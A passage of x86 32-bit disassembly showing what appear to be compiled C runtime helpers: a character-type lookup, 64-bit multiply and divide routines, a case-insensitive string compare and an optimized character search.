  42899a:	mov    eax,DWORD PTR [ebp+0xc]
  42899d:	lea    ecx,[eax+0x1]
  4289a0:	cmp    ecx,0x100
  4289a6:	mov    ecx,DWORD PTR [ebp+0x8]
  4289a9:	ja     0x4289b4
  4289ab:	mov    ecx,DWORD PTR [ecx+0x48]
  4289ae:	movzx  eax,WORD PTR [ecx+eax*2]
  4289b2:	jmp    0x428a08
  4289b4:	push   esi
  4289b5:	mov    edx,eax
  4289b7:	sar    edx,0x8
  4289ba:	push   edi
  4289bb:	mov    edi,DWORD PTR [ecx+0x48]
  4289be:	movzx  esi,dl
  4289c1:	test   BYTE PTR [edi+esi*2+0x1],0x80
  4289c6:	pop    edi
  4289c7:	pop    esi
  4289c8:	je     0x4289d9
  4289ca:	and    BYTE PTR [ebp-0x2],0x0
  4289ce:	push   0x2
  4289d0:	mov    BYTE PTR [ebp-0x3],al
  4289d3:	mov    BYTE PTR [ebp-0x4],dl
  4289d6:	pop    eax
  4289d7:	jmp    0x4289e3
  4289d9:	and    BYTE PTR [ebp-0x3],0x0
  4289dd:	mov    BYTE PTR [ebp-0x4],al
  4289e0:	xor    eax,eax
  4289e2:	inc    eax
  4289e3:	push   0x1
  4289e5:	push   DWORD PTR [ecx+0x14]
  4289e8:	push   DWORD PTR [ecx+0x4]
  4289eb:	lea    ecx,[ebp+0xe]
  4289ee:	push   ecx
  4289ef:	push   eax
  4289f0:	lea    eax,[ebp-0x4]
  4289f3:	push   eax
  4289f4:	push   0x1
  4289f6:	call   0x427a78
  4289fb:	add    esp,0x1c
  4289fe:	test   eax,eax
  428a00:	jne    0x428a04
  428a02:	leave  
  428a03:	ret    
  428a04:	movzx  eax,WORD PTR [ebp+0xe]
  428a08:	and    eax,DWORD PTR [ebp+0x10]
  428a0b:	leave  
  428a0c:	ret    
  428a0d:	int3   
  428a0e:	int3   
  428a0f:	int3   
  428a10:	mov    eax,DWORD PTR [esp+0x8]
  428a14:	mov    ecx,DWORD PTR [esp+0x10]
  428a18:	or     ecx,eax
  428a1a:	mov    ecx,DWORD PTR [esp+0xc]
  428a1e:	jne    0x428a29
  428a20:	mov    eax,DWORD PTR [esp+0x4]
  428a24:	mul    ecx
  428a26:	ret    0x10
  428a29:	push   ebx
  428a2a:	mul    ecx
  428a2c:	mov    ebx,eax
  428a2e:	mov    eax,DWORD PTR [esp+0x8]
  428a32:	mul    DWORD PTR [esp+0x14]
  428a36:	add    ebx,eax
  428a38:	mov    eax,DWORD PTR [esp+0x8]
  428a3c:	mul    ecx
  428a3e:	add    edx,ebx
  428a40:	pop    ebx
  428a41:	ret    0x10
  428a44:	int3   
  428a45:	int3   
  428a46:	int3   
  428a47:	int3   
  428a48:	int3   
  428a49:	int3   
  428a4a:	int3   
  428a4b:	int3   
  428a4c:	int3   
  428a4d:	int3   
  428a4e:	int3   
  428a4f:	int3   
  428a50:	push   ebp
  428a51:	mov    ebp,esp
  428a53:	push   edi
  428a54:	push   esi
  428a55:	push   ebx
  428a56:	mov    ecx,DWORD PTR [ebp+0x10]
  428a59:	or     ecx,ecx
  428a5b:	je     0x428aaa
  428a5d:	mov    esi,DWORD PTR [ebp+0x8]
  428a60:	mov    edi,DWORD PTR [ebp+0xc]
  428a63:	mov    bh,0x41
  428a65:	mov    bl,0x5a
  428a67:	mov    dh,0x20
  428a69:	lea    ecx,[ecx+0x0]
  428a6c:	mov    ah,BYTE PTR [esi]
  428a6e:	or     ah,ah
  428a70:	mov    al,BYTE PTR [edi]
  428a72:	je     0x428a9b
  428a74:	or     al,al
  428a76:	je     0x428a9b
  428a78:	add    esi,0x1
  428a7b:	add    edi,0x1
  428a7e:	cmp    ah,bh
  428a80:	jb     0x428a88
  428a82:	cmp    ah,bl
  428a84:	ja     0x428a88
  428a86:	add    ah,dh
  428a88:	cmp    al,bh
  428a8a:	jb     0x428a92
  428a8c:	cmp    al,bl
  428a8e:	ja     0x428a92
  428a90:	add    al,dh
  428a92:	cmp    ah,al
  428a94:	jne    0x428aa1
  428a96:	sub    ecx,0x1
  428a99:	jne    0x428a6c
  428a9b:	xor    ecx,ecx
  428a9d:	cmp    ah,al
  428a9f:	je     0x428aaa
  428aa1:	mov    ecx,0xffffffff
  428aa6:	jb     0x428aaa
  428aa8:	neg    ecx
  428aaa:	mov    eax,ecx
  428aac:	pop    ebx
  428aad:	pop    esi
  428aae:	pop    edi
  428aaf:	leave  
  428ab0:	ret    
  428ab1:	int3   
  428ab2:	int3   
  428ab3:	int3   
  428ab4:	int3   
  428ab5:	int3   
  428ab6:	int3   
  428ab7:	int3   
  428ab8:	int3   
  428ab9:	int3   
  428aba:	int3   
  428abb:	int3   
  428abc:	int3   
  428abd:	int3   
  428abe:	int3   
  428abf:	int3   
  428ac0:	push   esi
  428ac1:	mov    eax,DWORD PTR [esp+0x14]
  428ac5:	or     eax,eax
  428ac7:	jne    0x428af1
  428ac9:	mov    ecx,DWORD PTR [esp+0x10]
  428acd:	mov    eax,DWORD PTR [esp+0xc]
  428ad1:	xor    edx,edx
  428ad3:	div    ecx
  428ad5:	mov    ebx,eax
  428ad7:	mov    eax,DWORD PTR [esp+0x8]
  428adb:	div    ecx
  428add:	mov    esi,eax
  428adf:	mov    eax,ebx
  428ae1:	mul    DWORD PTR [esp+0x10]
  428ae5:	mov    ecx,eax
  428ae7:	mov    eax,esi
  428ae9:	mul    DWORD PTR [esp+0x10]
  428aed:	add    edx,ecx
  428aef:	jmp    0x428b38
  428af1:	mov    ecx,eax
  428af3:	mov    ebx,DWORD PTR [esp+0x10]
  428af7:	mov    edx,DWORD PTR [esp+0xc]
  428afb:	mov    eax,DWORD PTR [esp+0x8]
  428aff:	shr    ecx,1
  428b01:	rcr    ebx,1
  428b03:	shr    edx,1
  428b05:	rcr    eax,1
  428b07:	or     ecx,ecx
  428b09:	jne    0x428aff
  428b0b:	div    ebx
  428b0d:	mov    esi,eax
  428b0f:	mul    DWORD PTR [esp+0x14]
  428b13:	mov    ecx,eax
  428b15:	mov    eax,DWORD PTR [esp+0x10]
  428b19:	mul    esi
  428b1b:	add    edx,ecx
  428b1d:	jb     0x428b2d
  428b1f:	cmp    edx,DWORD PTR [esp+0xc]
  428b23:	ja     0x428b2d
  428b25:	jb     0x428b36
  428b27:	cmp    eax,DWORD PTR [esp+0x8]
  428b2b:	jbe    0x428b36
  428b2d:	dec    esi
  428b2e:	sub    eax,DWORD PTR [esp+0x10]
  428b32:	sbb    edx,DWORD PTR [esp+0x14]
  428b36:	xor    ebx,ebx
  428b38:	sub    eax,DWORD PTR [esp+0x8]
  428b3c:	sbb    edx,DWORD PTR [esp+0xc]
  428b40:	neg    edx
  428b42:	neg    eax
  428b44:	sbb    edx,0x0
  428b47:	mov    ecx,edx
  428b49:	mov    edx,ebx
  428b4b:	mov    ebx,ecx
  428b4d:	mov    ecx,eax
  428b4f:	mov    eax,esi
  428b51:	pop    esi
  428b52:	ret    0x10
  428b55:	int3   
  428b56:	int3   
  428b57:	int3   
  428b58:	int3   
  428b59:	int3   
  428b5a:	int3   
  428b5b:	int3   
  428b5c:	int3   
  428b5d:	int3   
  428b5e:	int3   
  428b5f:	int3   
  428b60:	lea    eax,[edx-0x1]
  428b63:	pop    ebx
  428b64:	ret    
  428b65:	lea    esp,[esp+0x0]
  428b6c:	lea    esp,[esp+0x0]
  428b70:	xor    eax,eax
  428b72:	mov    al,BYTE PTR [esp+0x8]
  428b76:	push   ebx
  428b77:	mov    ebx,eax
  428b79:	shl    eax,0x8
  428b7c:	mov    edx,DWORD PTR [esp+0x8]
  428b80:	test   edx,0x3
  428b86:	je     0x428b9d
  428b88:	mov    cl,BYTE PTR [edx]
  428b8a:	add    edx,0x1
  428b8d:	cmp    cl,bl
  428b8f:	je     0x428b60
  428b91:	test   cl,cl
  428b93:	je     0x428be6
  428b95:	test   edx,0x3
  428b9b:	jne    0x428b88
  428b9d:	or     ebx,eax
  428b9f:	push   edi
  428ba0:	mov    eax,ebx
  428ba2:	shl    ebx,0x10
  428ba5:	push   esi
  428ba6:	or     ebx,eax
  428ba8:	mov    ecx,DWORD PTR [edx]
  428baa:	mov    edi,0x7efefeff
  428baf:	mov    eax,ecx
  428bb1:	mov    esi,edi
  428bb3:	xor    ecx,ebx
  428bb5:	add    esi,eax
  428bb7:	add    edi,ecx
  428bb9:	xor    ecx,0xffffffff
  428bbc:	xor    eax,0xffffffff
  428bbf:	xor    ecx,edi
  428bc1:	xor    eax,esi
  428bc3:	add    edx,0x4
  428bc6:	and    ecx,0x81010100
  428bcc:	jne    0x428bea
  428bce:	and    eax,0x81010100
  428bd3:	je     0x428ba8
  428bd5:	and    eax,0x1010100
  428bda:	jne    0x428be4
  428bdc:	and    esi,0x80000000
  428be2:	jne    0x428ba8
  428be4:	pop    esi
  428be5:	pop    edi
  428be6:	pop    ebx
  428be7:	xor    eax,eax
  428be9:	ret    
  428bea:	mov    eax,DWORD PTR [edx-0x4]
  428bed:	cmp    al,bl
  428bef:	je     0x428c27
  428bf1:	test   al,al
  428bf3:	je     0x428be4
  428bf5:	cmp    ah,bl
  428bf7:	je     0x428c20
  428bf9:	test   ah,ah
  428bfb:	je     0x428be4
  428bfd:	shr    eax,0x10
  428c00:	cmp    al,bl
  428c02:	je     0x428c19
  428c04:	test   al,al
  428c06:	je     0x428be4
  428c08:	cmp    ah,bl
  428c0a:	je     0x428c12
  428c0c:	test   ah,ah
  428c0e:	je     0x428be4
  428c10:	jmp    0x428ba8
  428c12:	pop    esi
  428c13:	pop    edi
  428c14:	lea    eax,[edx-0x1]
  428c17:	pop    ebx
  428c18:	ret    
  428c19:	lea    eax,[edx-0x2]
  428c1c:	pop    esi
  428c1d:	pop    edi
  428c1e:	pop    ebx
  428c1f:	ret    
  428c20:	lea    eax,[edx-0x3]
  428c23:	pop    esi
  428c24:	pop    edi
  428c25:	pop    ebx
  428c26:	ret    
  428c27:	lea    eax,[edx-0x4]
  428c2a:	pop    esi
  428c2b:	pop    edi
  428c2c:	pop    ebx
  428c2d:	ret    
  428c2e:	jmp    DWORD PTR ds:0x429104
